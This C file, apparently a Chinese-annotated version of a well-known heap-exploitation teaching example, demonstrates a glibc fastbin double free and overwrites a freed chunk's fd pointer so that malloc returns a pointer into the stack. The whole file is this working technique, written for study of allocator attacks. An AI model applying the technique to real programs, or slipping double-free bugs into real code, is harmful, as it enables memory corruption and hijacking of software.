#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main()
{
    fprintf(stderr, "这个例子拓展自 fastbin_dup.c，通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）\n");
    unsigned long long stack_var;

    fprintf(stderr, "我们想通过 malloc 申请到 %p.\n", 8+(char *)&stack_var);

    fprintf(stderr, "先申请3 个 chunk\n");
    char* a = malloc(8);
    strcpy(a, "AAAAAAAA");
    char* b = malloc(8);
    strcpy(b, "BBBBBBBB");
    char* c = malloc(8);
    strcpy(c, "CCCCCCCC");
    
    fprintf(stderr, "chunk a: %p\n", a);
    fprintf(stderr, "chunk b: %p\n", b);
    fprintf(stderr, "chunk c: %p\n", c);

    fprintf(stderr, "free 掉 chunk a\n");
    free(a);

    fprintf(stderr, "如果还对 %p 进行 free, 程序会崩溃。因为 %p 现在是 fastbin 的第一个\n", a, a);
    // free(a);
    fprintf(stderr, "先对 b %p 进行 free\n", b);
    free(b);

    fprintf(stderr, "接下来就可以对 %p 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了\n", a);
    free(a);

    fprintf(stderr, "现在 fastbin 的链表是 [ %p, %p, %p ] 接下来通过修改 %p 上的内容来进行攻击.\n", a, b, a, a);
    unsigned long long *d = malloc(8);

    fprintf(stderr, "第一次 malloc(8): %p\n", d);
    char* e = malloc(8);
    strcpy(e, "EEEEEEEE");
    fprintf(stderr, "第二次 malloc(8): %p\n", e);
    fprintf(stderr, "现在 fastbin 表中只剩 [ %p ] 了\n", a);
    fprintf(stderr, "接下来往 %p 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去\n", a);
    stack_var = 0x20;

    fprintf(stderr, "现在覆盖 %p 前面的 8 字节，修改 fd 指针指向 stack_var 前面 0x20 的位置\n", a);
    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

    char* f = malloc(8);
    strcpy(f, "FFFFFFFF");
    fprintf(stderr, "第三次 malloc(8): %p, 把栈地址放到 fastbin 链表中\n", f);
    char* g = malloc(8);
    strcpy(g, "GGGGGGGG");
    fprintf(stderr, "这一次 malloc(8) 就申请到了栈上去: %p\n", g);
}
